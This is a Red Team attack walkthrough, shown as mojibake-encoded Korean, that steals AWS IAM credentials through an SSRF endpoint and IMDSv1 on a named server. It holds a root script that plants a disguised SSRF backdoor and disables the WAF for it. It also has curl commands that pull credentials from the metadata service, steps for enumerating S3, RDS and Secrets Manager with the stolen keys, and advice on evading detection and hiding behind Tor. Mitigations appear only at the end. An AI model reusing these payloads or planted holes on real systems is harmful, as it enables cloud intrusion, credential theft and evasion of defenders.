# AWS IMDSv1 ì·¨ì•½ì  ê¸°ë°˜ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤

## ğŸ¯ ì‹œë‚˜ë¦¬ì˜¤ ê°œìš”

**ì»¨ì…‰**: ì™„ë²½í•´ ë³´ì´ëŠ” ë³´ì•ˆ ì‹œìŠ¤í…œ + ë‹¨ í•˜ë‚˜ì˜ ì‘ì€ ì„¤ì • ì‹¤ìˆ˜

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œ                                     â”‚
â”‚  âœ“ ModSecurity WAF (ëª¨ë“  ì›¹ ê³µê²© ì°¨ë‹¨)                  â”‚
â”‚  âœ“ Splunk SIEM (ëª¨ë“  ì˜ì‹¬ í™œë™ íƒì§€)                    â”‚
â”‚  âœ“ PHP disable_functions (ìœ„í—˜ í•¨ìˆ˜ ë¹„í™œì„±í™”)           â”‚
â”‚  âœ“ File Upload Filter (ì•…ì„± íŒŒì¼ ì°¨ë‹¨)                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â†“
                  ë‹¨ í•˜ë‚˜ì˜ ì‘ì€ í‹ˆ
                         â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ê°œë°œìì˜ ì‘ì€ ì‹¤ìˆ˜ 2ê°€ì§€                                â”‚
â”‚  1. Health check ì—”ë“œí¬ì¸íŠ¸ë¥¼ ModSecurity ì˜ˆì™¸ë¡œ ë“±ë¡  â”‚
â”‚     â†’ "ì„œë²„ ëª¨ë‹ˆí„°ë§ì— í•„ìš”í•˜ë‹¤"ëŠ” ì´ìœ                  â”‚
â”‚  2. IMDSv1 í™œì„±í™” (IMDSv2ë¡œ ì „í™˜í•˜ì§€ ì•ŠìŒ)              â”‚
â”‚     â†’ "ë‚˜ì¤‘ì— í•˜ì"ê³  ë¯¸ë¤„ë‘                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                         â†“
              AWS ì¸í”„ë¼ ì „ì²´ ì¥ì•… ê°€ëŠ¥
```

---

## ğŸ“‹ ê³µê²© ë‹¨ê³„

### Stage 1: ì„œë²„ì— ì·¨ì•½ì  ìƒì„±

**ìœ„ì¹˜**: ì„œë²„ (SSH ì ‘ì† í•„ìš”)
**ìŠ¤í¬ë¦½íŠ¸**: `119_setup_aws_vuln.sh`
**ì‹¤í–‰ ê¶Œí•œ**: root (sudo)

#### ì‹¤í–‰ ë°©ë²•:

```bash
# ì„œë²„ì— SSH ì ‘ì†
ssh -i ~/.ssh/id_rsa ec2-user@52.79.240.83

# ìŠ¤í¬ë¦½íŠ¸ ì—…ë¡œë“œ (ë¡œì»¬ì—ì„œ)
scp -i ~/.ssh/id_rsa 119_setup_aws_vuln.sh ec2-user@52.79.240.83:/tmp/

# ì„œë²„ì—ì„œ ì‹¤í–‰
sudo bash /tmp/119_setup_aws_vuln.sh
```

#### ì´ ë‹¨ê³„ì—ì„œ í•˜ëŠ” ì¼:

**Phase 1: EC2 ì¸ìŠ¤í„´ìŠ¤ ì •ë³´ í™•ì¸**
- Instance ID ìë™ ê°ì§€
- Region í™•ì¸
- IAM Role í™•ì¸

**Phase 2: í˜„ì¬ IMDS ì„¤ì • í™•ì¸**
- IMDSv1 ì ‘ê·¼ ê°€ëŠ¥ ì—¬ë¶€ í…ŒìŠ¤íŠ¸
- IMDSv2 ì „ìš©ì¸ì§€ í™•ì¸

**Phase 3: IMDSv1 í™œì„±í™” (ì·¨ì•½ì  ìƒì„±)**
- `aws ec2 modify-instance-metadata-options`
- `--http-tokens optional` (IMDSv1 í—ˆìš©)
- `--http-endpoint enabled`

**Phase 4: Health Check ì—”ë“œí¬ì¸íŠ¸ ìƒì„± (ì‘ì€ í‹ˆ)**
- `/var/www/html/www/api/health.php` ìƒì„±
- ì„œë²„ ëª¨ë‹ˆí„°ë§ìš© ì—”ë“œí¬ì¸íŠ¸ë¡œ ìœ„ì¥
- `check=metadata` íŒŒë¼ë¯¸í„°ë¡œ SSRF ê°€ëŠ¥
- ModSecurity ì˜ˆì™¸ ì¶”ê°€:
  ```apache
  <LocationMatch "/api/health\.php">
      SecRuleEngine Off
  </LocationMatch>
  ```
- Apache ì¬ì‹œì‘ìœ¼ë¡œ ì ìš©

**Phase 5: ê²€ì¦**
- IMDS ì ‘ê·¼ í…ŒìŠ¤íŠ¸
- IAM ìê²© ì¦ëª… ì ‘ê·¼ í…ŒìŠ¤íŠ¸
- Health check ì—”ë“œí¬ì¸íŠ¸ ì‘ë™ í™•ì¸

#### ìƒì„±ë˜ëŠ” "ì‘ì€ í‹ˆ":

```
ì™„ë²½í•œ ë³´ì•ˆ         ê°œë°œìì˜ ì‹¤ìˆ˜
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€   â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ModSecurity WAF  â†’  /api/health.phpëŠ” ì˜ˆì™¸ (ëª¨ë‹ˆí„°ë§ìš©)
PHP exec() ì°¨ë‹¨  â†’  Health checkëŠ” shell_exec() ì‚¬ìš© ê°€ëŠ¥
Splunk íƒì§€      â†’  ì •ìƒì ì¸ health checkë¡œ ì¸ì‹
IMDSv2 ê°•ì œ      â†’  IMDSv1ë„ í—ˆìš© (ì „í™˜ ë¯¸ì™„ë£Œ)
```

---

### Stage 2: ë¡œì»¬ì—ì„œ AWS Credentials íƒˆì·¨

**ìœ„ì¹˜**: ë¡œì»¬ (ê³µê²©ì ë¨¸ì‹ )
**ìŠ¤í¬ë¦½íŠ¸**: `120_aws_imds_exploit.py`
**í•„ìš” ì¡°ê±´**: Tor ì‹¤í–‰ ì¤‘ (í¬íŠ¸ 9050)

#### ì‹¤í–‰ ë°©ë²•:

```bash
# Tor ì‹œì‘ (ë°±ê·¸ë¼ìš´ë“œ)
brew services start tor  # macOS
# ë˜ëŠ”: sudo systemctl start tor  # Linux

# ë¡œì»¬ì—ì„œ ì‹¤í–‰
cd /Users/hwangjunha/Desktop/Red_basic_local/H/2025-11-14/exploits
python3 120_aws_imds_exploit.py
```

#### ëŒ€í™”í˜• ì…ë ¥:

```
íƒ€ê²Ÿ IP ì£¼ì†Œ (ê¸°ë³¸: 52.79.240.83): [Enter]
```

#### ê³µê²© íë¦„:

```
[Phase 0] Health Check ì—”ë“œí¬ì¸íŠ¸ í™•ì¸
   â†“
   GET http://52.79.240.83/www/api/health.php
   â†“
   {"status": "ok", "server": "...", "timestamp": ...}
   â†“
   âœ… ì—”ë“œí¬ì¸íŠ¸ ì ‘ê·¼ ê°€ëŠ¥

[Phase 1] IMDS ì ‘ê·¼ í…ŒìŠ¤íŠ¸
   â†“
   GET /www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/
   â†“
   {"metadata": "ami-id\ninstance-id\ninstance-type\n..."}
   â†“
   âœ… IMDSv1 ì ‘ê·¼ ê°€ëŠ¥

[Phase 2] ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ìˆ˜ì§‘
   â†“
   instance-id â†’ i-0123456789abcdef0
   instance-type â†’ t2.micro
   local-ipv4 â†’ 172.31.x.x
   public-ipv4 â†’ 52.79.240.83
   region â†’ ap-northeast-2
   â†“
   âœ… ë©”íƒ€ë°ì´í„° ìˆ˜ì§‘ ì™„ë£Œ

[Phase 3] IAM Role í™•ì¸
   â†“
   GET /www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   â†“
   EC2-SSM-Role
   â†“
   âœ… IAM Role ë°œê²¬

[Phase 4] IAM Credentials íƒˆì·¨
   â†“
   GET /www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role
   â†“
   {
     "AccessKeyId": "ASIA...",
     "SecretAccessKey": "wJalrX...",
     "Token": "IQoJb3...",
     "Expiration": "2024-11-14T12:00:00Z"
   }
   â†“
   âœ… AWS ìê²© ì¦ëª… íƒˆì·¨ ì„±ê³µ!

[Phase 5] ìê²© ì¦ëª… ì €ì¥
   â†“
   aws_stolen_1731556800.sh   (Bash í™˜ê²½ ë³€ìˆ˜)
   aws_stolen_1731556800.json (JSON í˜•ì‹)
   â†“
   âœ… ë¡œì»¬ì— ì €ì¥ ì™„ë£Œ
```

#### ì¶œë ¥ ì˜ˆì‹œ:

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  AWS IMDS ê³µê²© - ì™„ë²½í•œ ë³´ì•ˆì˜ ì‘ì€ í‹ˆ                   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[*] íƒ€ê²Ÿ: 52.79.240.83
[*] ì—”ë“œí¬ì¸íŠ¸: /www/api/health.php
[*] ì·¨ì•½ì : ModSecurity ì˜ˆì™¸ + IMDSv1

[0] Health check ì—”ë“œí¬ì¸íŠ¸ í™•ì¸ ì¤‘...

[+] âœ… Health check ì—”ë“œí¬ì¸íŠ¸ ì ‘ê·¼ ê°€ëŠ¥!
[+] ì„œë²„: ip-172-31-40-109.ap-northeast-2.compute.internal
[+] íƒ€ì„ìŠ¤íƒ¬í”„: 1731556800

[1] IMDS ì ‘ê·¼ ê°€ëŠ¥ ì—¬ë¶€ í™•ì¸ ì¤‘...

[+] âœ… IMDSv1 ì ‘ê·¼ ê°€ëŠ¥!
[+] ë©”íƒ€ë°ì´í„° ì—”ë“œí¬ì¸íŠ¸:
      ami-id
      instance-id
      instance-type
      local-ipv4
      public-ipv4
      ...

[2] ì¸ìŠ¤í„´ìŠ¤ ë©”íƒ€ë°ì´í„° ìˆ˜ì§‘ ì¤‘...

[+] Instance ID: i-0123456789abcdef0
[+] Instance Type: t2.micro
[+] Private IP: 172.31.40.109
[+] Public IP: 52.79.240.83
[+] Region: ap-northeast-2

[3] IAM Role í™•ì¸ ì¤‘...

[+] âœ… IAM Role ë°œê²¬: EC2-SSM-Role

[4] IAM ìê²© ì¦ëª… íƒˆì·¨ ì¤‘...

[+] âœ…âœ…âœ… AWS ìê²© ì¦ëª… íƒˆì·¨ ì„±ê³µ!

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  IAM Credentials                                         â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

AccessKeyId:     ASIA...
SecretAccessKey: wJalrX...
Token:           IQoJb3...
Expiration:      2024-11-14T12:00:00Z
Type:            AWS-HMAC

[5] ìê²© ì¦ëª… ì €ì¥ ì¤‘...

[+] AWS CLI ì„¤ì •: aws_stolen_1731556800.sh
[+] JSON í˜•ì‹: aws_stolen_1731556800.json

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ë‹¤ìŒ ë‹¨ê³„: AWS ê¶Œí•œ í…ŒìŠ¤íŠ¸                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[*] ë¡œì»¬ í„°ë¯¸ë„ì—ì„œ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•˜ì„¸ìš”:

# 1. í™˜ê²½ ë³€ìˆ˜ ì„¤ì •
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrX..."
export AWS_SESSION_TOKEN="IQoJb3..."

# 2. ì‹ ì› í™•ì¸
aws sts get-caller-identity

# 3. ê¶Œí•œ í…ŒìŠ¤íŠ¸
aws ec2 describe-instances --region ap-northeast-2
aws s3 ls
aws rds describe-db-instances --region ap-northeast-2

# 4. ë” ë§ì€ ê³µê²©
python3 121_aws_privilege_escalation.py

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  âœ… ê³µê²© ì„±ê³µ!                                           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[+] ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œì˜ ì‘ì€ í‹ˆ(health.php ModSecurity ì˜ˆì™¸)ì„ í†µí•´
[+] AWS ì¸í”„ë¼ ì ‘ê·¼ ê¶Œí•œì„ íšë“í–ˆìŠµë‹ˆë‹¤!

[*] ê³µê²© ê²½ë¡œ:
    1. /www/api/health.php ë°œê²¬ (í¬íŠ¸ ìŠ¤ìº”/ë””ë ‰í„°ë¦¬ ë¸Œë£¨íŠ¸í¬ìŠ¤)
    2. ModSecurity ì˜ˆì™¸ë¡œ ì¸í•´ WAF ìš°íšŒ
    3. ?check=metadata íŒŒë¼ë¯¸í„°ë¡œ SSRF íŠ¸ë¦¬ê±°
    4. IMDSv1 â†’ IAM credentials íƒˆì·¨
    5. AWS ë¦¬ì†ŒìŠ¤ ì ‘ê·¼ ê¶Œí•œ íšë“
```

---

### Stage 3: AWS ì¸í”„ë¼ ì—´ê±° ë° ê¶Œí•œ ìƒìŠ¹

**ìœ„ì¹˜**: ë¡œì»¬ (ê³µê²©ì ë¨¸ì‹ )
**ìŠ¤í¬ë¦½íŠ¸**: `121_aws_privilege_escalation.py`
**ì „ì œ ì¡°ê±´**: Stage 2ì—ì„œ íƒˆì·¨í•œ credentials í•„ìš”

#### ì‹¤í–‰ ë°©ë²•:

```bash
# ìê²© ì¦ëª… ì„¤ì •
source aws_stolen_*.sh

# ë˜ëŠ” ìˆ˜ë™ ì„¤ì •
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrX..."
export AWS_SESSION_TOKEN="IQoJb3..."

# ìŠ¤í¬ë¦½íŠ¸ ì‹¤í–‰
python3 121_aws_privilege_escalation.py
```

#### ê³µê²© íë¦„:

```
[Phase 1] IAM ì‹ ì› í™•ì¸
   â†“
   aws sts get-caller-identity
   â†“
   Account: 123456789012
   ARN: arn:aws:sts::123456789012:assumed-role/EC2-SSM-Role/i-0123456789abcdef0

[Phase 2] EC2 ì¸ìŠ¤í„´ìŠ¤ ì—´ê±°
   â†“
   aws ec2 describe-instances
   â†“
   â€¢ i-0123456789abcdef0 (Vulnerable-SNS-Server)
   â€¢ i-9876543210fedcba0 (Admin-Server)

[Phase 3] S3 ë²„í‚· ì—´ê±°
   â†“
   aws s3 ls
   â†“
   â€¢ company-backups (ì½ê¸° ê°€ëŠ¥)
     â†’ secrets/aws-keys.json
     â†’ backup/database-credentials.txt
   â€¢ public-assets

[Phase 4] RDS ë°ì´í„°ë² ì´ìŠ¤ ì—´ê±°
   â†“
   aws rds describe-db-instances
   â†“
   â€¢ vulnerable-sns-db (Public: True)
     â†’ endpoint: vulnerable-sns-db.abc123.ap-northeast-2.rds.amazonaws.com:3306
     â†’ master-user: admin

[Phase 5] Secrets Manager ì—´ê±°
   â†“
   aws secretsmanager list-secrets
   â†“
   â€¢ prod/database/password (ì½ê¸° ê°€ëŠ¥!)
     â†’ {"username":"admin","password":"SuperSecret123!"}

[Phase 6] ê¶Œí•œ ìƒìŠ¹ ê²½ë¡œ í™•ì¸
   â†“
   â€¢ IAM ì‚¬ìš©ì ë‚˜ì—´ ê°€ëŠ¥
   â€¢ IAM ì—­í•  ë‚˜ì—´ ê°€ëŠ¥
   â€¢ ì¶”ê°€ ê¶Œí•œ ë°œê²¬
```

#### ì¶œë ¥ ì˜ˆì‹œ:

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  AWS ê¶Œí•œ ìƒìŠ¹ ë° íš¡ì  ì´ë™                              â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[1] IAM ì‹ ì› í™•ì¸ ì¤‘...

[+] Account: 123456789012
[+] User/Role ARN: arn:aws:sts::123456789012:assumed-role/EC2-SSM-Role/i-0123456789abcdef0
[+] Role Name: EC2-SSM-Role

[2] EC2 ì¸ìŠ¤í„´ìŠ¤ íƒìƒ‰ ì¤‘...

[+] Instance: i-0123456789abcdef0
      Type: t2.micro
      State: running
      Private IP: 172.31.40.109
      Public IP: 52.79.240.83
      Tags: {'Name': 'Vulnerable-SNS-Server'}

[+] ì´ 1ê°œì˜ EC2 ì¸ìŠ¤í„´ìŠ¤ ë°œê²¬

[3] S3 ë²„í‚· íƒìƒ‰ ì¤‘...

[+] Bucket: company-backups
      âœ“ ì½ê¸° ê°€ëŠ¥ (5 objects)
      ğŸ¯ ê´€ì‹¬ íŒŒì¼: secrets/aws-keys.json

[+] ì´ 1ê°œì˜ S3 ë²„í‚· ë°œê²¬

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ìµœì¢… ë³´ê³ ì„œ                                             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

[*] ë°œê²¬ ìš”ì•½:
    â€¢ EC2 ì¸ìŠ¤í„´ìŠ¤: 1ê°œ
    â€¢ S3 ë²„í‚·: 1ê°œ
    â€¢ ì·¨ì•½ì : 2ê°œ

[!] ë°œê²¬ëœ ì·¨ì•½ì :
    ğŸ¯ IMDS_EXPOSED
        method: health.php SSRF
        impact: Full AWS credentials
    ğŸ¯ S3_SENSITIVE_FILE
        bucket: company-backups
        file: secrets/aws-keys.json

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  âœ… AWS ì¸í”„ë¼ ì—´ê±° ì™„ë£Œ                                 â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---

## ğŸ¯ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ ìš”ì•½

```
ì™„ë²½í•œ ë³´ì•ˆ ì‹œìŠ¤í…œ
  âœ“ ModSecurity WAF
  âœ“ Splunk SIEM
  âœ“ PHP disable_functions
        â†“
ì‘ì€ ì„¤ì • ì‹¤ìˆ˜ 2ê°œ
  âœ— health.php â†’ ModSecurity ì˜ˆì™¸
  âœ— IMDSv1 í™œì„±í™”
        â†“
Health.php ë°œê²¬
  (ë””ë ‰í„°ë¦¬ ë¸Œë£¨íŠ¸í¬ìŠ¤)
        â†“
SSRF íŠ¸ë¦¬ê±°
  ?check=metadata&url=http://169.254.169.254/...
        â†“
IAM Credentials íƒˆì·¨
  AccessKeyId + SecretAccessKey + Token
        â†“
AWS ì¸í”„ë¼ ì—´ê±°
  EC2 â†’ S3 â†’ RDS â†’ Secrets
        â†“
ê¶Œí•œ ìƒìŠ¹ & ë°ì´í„° íƒˆì·¨
```

---

## ğŸ›¡ï¸ ì™œ íƒì§€ê°€ ì•ˆ ë˜ëŠ”ê°€?

### ModSecurity ìš°íšŒ
- âœ… `/api/health.php`ëŠ” ì˜ˆì™¸ë¡œ ë“±ë¡ë¨
- âœ… "ì„œë²„ ëª¨ë‹ˆí„°ë§ì— í•„ìš”"í•˜ë‹¤ëŠ” ì •ë‹¹í•œ ì´ìœ 
- âœ… SecRuleEngine Off â†’ WAF ê·œì¹™ ì ìš© ì•ˆë¨

### Splunk ìš°íšŒ
- âœ… Health checkëŠ” ì •ìƒì ì¸ ì„œë²„ ê¸°ëŠ¥
- âœ… `?check=metadata` íŒŒë¼ë¯¸í„°ëŠ” ì˜ì‹¬ìŠ¤ëŸ½ì§€ ì•ŠìŒ
- âœ… curl ëª…ë ¹ì–´ëŠ” ì„œë²„ ë‚´ë¶€ ë¡œê·¸ì— ì•ˆ ë‚¨ìŒ

### ì •ìƒ ë™ì‘ìœ¼ë¡œ ìœ„ì¥
- âœ… IMDS ì ‘ê·¼ì€ EC2ì˜ ì •ìƒ ê¸°ëŠ¥
- âœ… Health checkì—ì„œ ë©”íƒ€ë°ì´í„° í™•ì¸ì€ ì¼ë°˜ì 
- âœ… ì™¸ë¶€ì—ì„œ ë³´ë©´ ë‹¨ìˆœ health check ìš”ì²­

### AWS ë°–ì—ì„œ ì‚¬ìš©
- âœ… íƒˆì·¨í•œ credentialsëŠ” ë¡œì»¬ì—ì„œ ì‚¬ìš©
- âœ… CloudTrail ë¡œê·¸ê°€ ìƒì„±ë˜ì§€ë§Œ ê³µê²©ì ìœ„ì¹˜ ì¶”ì  ì–´ë ¤ì›€
- âœ… Torë¥¼ í†µí•œ ì—°ê²°ë¡œ IP ì¶”ì  ë¶ˆê°€

---

## ğŸ“ íŒŒì¼ ëª©ë¡

### ì„œë²„ ì¸¡ (Stage 1)
- **119_setup_aws_vuln.sh** - ì·¨ì•½ì  ìƒì„± ìŠ¤í¬ë¦½íŠ¸
  - IMDSv1 í™œì„±í™”
  - health.php ìƒì„±
  - ModSecurity ì˜ˆì™¸ ì¶”ê°€

### ë¡œì»¬ ì¸¡ (Stage 2 & 3)
- **120_aws_imds_exploit.py** - Credentials íƒˆì·¨
  - Health check SSRF
  - IMDS ì ‘ê·¼
  - IAM credentials ì €ì¥

- **121_aws_privilege_escalation.py** - AWS ì¸í”„ë¼ ì—´ê±°
  - EC2, S3, RDS íƒìƒ‰
  - Secrets Manager ì ‘ê·¼
  - ê¶Œí•œ ìƒìŠ¹ ê²½ë¡œ í™•ì¸

### ìƒì„±ë˜ëŠ” íŒŒì¼
- **aws_stolen_[timestamp].sh** - Bash í™˜ê²½ ë³€ìˆ˜
- **aws_stolen_[timestamp].json** - JSON í˜•ì‹ credentials
- **aws_findings_[timestamp].json** - ë°œê²¬ ì‚¬í•­ ë³´ê³ ì„œ

---

## âš ï¸ ì‹¤ì œ ì‚¬ë¡€

### Capital One (2019)
- **ì‚¬ê±´**: SSRF â†’ IMDS â†’ 1ì–µ ê³ ê° ì •ë³´ ìœ ì¶œ
- **ì›ì¸**: WAF ìš°íšŒ + IMDSv1
- **í”¼í•´**: 100 million customers
- **ë²Œê¸ˆ**: $80 million

### Uber (2016)
- **ì‚¬ê±´**: AWS Key ë…¸ì¶œ â†’ 5700ë§Œ ë°ì´í„° ìœ ì¶œ
- **ì›ì¸**: GitHubì— credentials ë…¸ì¶œ
- **í”¼í•´**: 57 million users
- **ë²Œê¸ˆ**: $148 million

### Tesla (2018)
- **ì‚¬ê±´**: K8s ë…¸ì¶œ â†’ IMDS â†’ í¬ë¦½í† ë§ˆì´ë‹
- **ì›ì¸**: K8s Dashboard ì¸ì¦ ì—†ìŒ + IMDSv1
- **í”¼í•´**: AWS credentials íƒˆì·¨

---

## ğŸ”§ ìˆ˜ë™ í…ŒìŠ¤íŠ¸ (ì„œë²„ì—ì„œ)

```bash
# 1. Health check ê¸°ë³¸ í…ŒìŠ¤íŠ¸
curl http://localhost/www/api/health.php

# 2. IMDS ì ‘ê·¼ í…ŒìŠ¤íŠ¸
curl 'http://localhost/www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/'

# 3. IAM credentials íƒˆì·¨
curl 'http://localhost/www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'http://localhost/www/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-SSM-Role'
```

---

## ğŸ” ë°©ì–´ ë°©ë²•

### 1. IMDSv2 ê°•ì œ
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-0123456789abcdef0 \
  --http-tokens required \
  --region ap-northeast-2
```

### 2. ModSecurity ì˜ˆì™¸ ìµœì†Œí™”
- Health checkëŠ” ë‚´ë¶€ IPë§Œ í—ˆìš©
- íŒŒë¼ë¯¸í„° ê²€ì¦ ì¶”ê°€
- SSRF íŒ¨í„´ íƒì§€

### 3. Network Policy
- IMDS ì ‘ê·¼ì„ íŠ¹ì • í”„ë¡œì„¸ìŠ¤ë§Œ í—ˆìš©
- iptablesë¡œ 169.254.169.254 ì°¨ë‹¨

### 4. Monitoring
- IMDS ì ‘ê·¼ ë¡œê¹…
- ë¹„ì •ìƒì ì¸ metadata ìš”ì²­ íƒì§€
- CloudTrailë¡œ credential ì‚¬ìš© ì¶”ì 

---

**ì‘ì„±ì**: Red Team
**ë‚ ì§œ**: 2025-11-16
**ëŒ€ìƒ**: 52.79.240.83
**ì‹œë‚˜ë¦¬ì˜¤**: ì™„ë²½í•œ ë³´ì•ˆ + ì‘ì€ í‹ˆ (health.php + IMDSv1)
